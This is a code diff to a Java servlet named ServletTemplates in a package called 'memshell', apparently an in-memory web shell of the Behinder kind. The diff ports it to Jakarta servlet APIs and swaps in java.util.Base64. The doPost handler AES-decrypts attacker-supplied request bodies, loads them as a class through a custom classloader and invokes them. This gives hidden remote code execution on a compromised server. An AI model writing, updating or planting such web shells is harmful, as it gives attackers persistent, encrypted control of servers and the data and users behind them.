@@ -1,18 +1,26 @@
 package com.boogipop.memshell;
 
+import jakarta.servlet.ServletRequest;
+import jakarta.servlet.ServletResponse;
+import jakarta.servlet.http.HttpServlet;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.Method;
+import java.util.Base64;
 import java.util.Scanner;
 
 public class ServletTemplates extends HttpServlet {
+    private static byte[] BASE64Decoder(String data){
+        byte[] inputBytes = data.getBytes();
+        Base64.Decoder encoder = Base64.getDecoder();
+        byte[] encodedBytes = encoder.decode(inputBytes);
+        return encodedBytes;
+    }
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
         System.out.println("[+] Dynamic Servlet says hello");
@@ -38,7 +46,7 @@ public class ServletTemplates extends HttpServlet {
                     request.getSession().setAttribute("u",k);
                     Cipher cipher = Cipher.getInstance("AES");
                     cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
-                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                    byte[] evilClassBytes = cipher.doFinal(BASE64Decoder(request.getReader().readLine()));
                     Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                     Object evilObject = evilClass.newInstance();
                     Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
